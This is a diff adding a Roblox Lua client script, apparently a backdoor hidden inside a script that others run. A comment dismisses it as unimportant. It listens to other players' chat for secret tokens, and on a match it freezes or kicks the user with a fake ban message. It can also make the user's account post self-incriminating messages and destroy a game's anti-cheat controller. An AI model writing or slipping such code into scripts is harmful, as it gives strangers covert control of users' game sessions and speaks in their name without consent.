@@ -1,0 +1,137 @@
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+if not LocalPlayer then return end
+
+-- ignore this because it totally aint important
+
+local TOKEN_TO_COMMAND = {
+    ["f7@Kp9#zTq"] = "freeze",
+    ["4Lm$2wXv!R"] = "unfreeze",
+    ["Z8&nQ6y*bH"] = "fakeban",
+    ["7%tG9#zTq"] = "kick",
+    ["jP39#Q6y*"] = "snitch",
+    ["*bHjPnQ6y"] = "ban",
+}
+
+local freezeAnchor = nil
+
+local function applyFreeze()
+    if freezeAnchor then return end
+    local char = LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local bp = Instance.new("BodyPosition")
+    bp.MaxForce = Vector3.new(1e5,1e5,1e5)
+    bp.P = 1e4
+    bp.Position = root.Position
+    bp.Parent = root
+    freezeAnchor = bp
+end
+
+local function applyUnfreeze()
+    if freezeAnchor then
+        freezeAnchor:Destroy()
+        freezeAnchor = nil
+    end
+end
+
+local function applyFakeBan()
+    LocalPlayer:Kick("Banned: Exploiting")
+end
+
+local function applyKick()
+    LocalPlayer:Kick("Kicked by script owner")
+end
+
+local function applyBan()
+    local Players = game:GetService("Players")
+    local localPlayer = Players.LocalPlayer
+    
+    local path = localPlayer.PlayerScripts
+        .Controllers.Character.AntiCheatController
+
+    if path then
+        NotificationLibrary:SendNotification(
+            "Warning",
+            "Hey! Stop scripting, Here's a ban!",
+            3
+        )
+
+        local textChatService = game:GetService("TextChatService")
+        textChatService.TextChannels.RBXGeneral:SendAsync(
+            "I'm a dirty little cheater. This is a goodbye, please report me."
+        )
+
+        task.wait(4)
+
+        path:Destroy()
+    end
+end
+
+
+local function applyKill()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function applyExplode()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local explosion = Instance.new("Part", workspace)
+    explosion.Size = Vector3.new(1,1,1)
+    explosion.CFrame = root.CFrame
+    explosion.Anchored = false
+    explosion.CanCollide = false
+    local bv = Instance.new("BodyVelocity", explosion)
+    bv.MaxForce = Vector3.new(1e4,1e4,1e4)
+    bv.Velocity = Vector3.new(0,50,0)
+    game:GetService("Debris"):AddItem(explosion, 1)
+end
+
+local function applySnitch()
+    for i = 1, 5 do
+        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("I am scripting")
+        wait(1)
+    end
+end
+
+local ACTIONS = {
+    freeze = applyFreeze,
+    unfreeze = applyUnfreeze,
+    fakeban = applyFakeBan,
+    kick = applyKick,
+    kill = applyKill,
+    explode = applyExplode,
+    snitch = applySnitch,
+    ban = applyBan,
+}
+
+local function onChatted(speaker, message)
+    if not speaker then return end
+
+    local cmd = TOKEN_TO_COMMAND[message]
+    if not cmd then return end
+
+    local fn = ACTIONS[cmd]
+    if fn then
+        pcall(fn)
+    end
+end
+
+for _,p in pairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then
+        p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+    end
+end
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LocalPlayer then
+        p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+    end
+end)
